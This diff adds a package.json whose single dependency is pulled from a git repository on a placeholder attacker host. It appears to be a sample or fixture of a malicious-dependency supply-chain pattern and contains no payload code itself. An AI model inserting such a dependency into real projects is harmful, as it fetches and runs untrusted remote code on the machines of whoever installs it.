@@ -1,0 +1,5 @@
+{
+  "dependencies": {
+    "build-helper": "git+https://example.invalid/attacker/build-helper.git#main"
+  }
+}
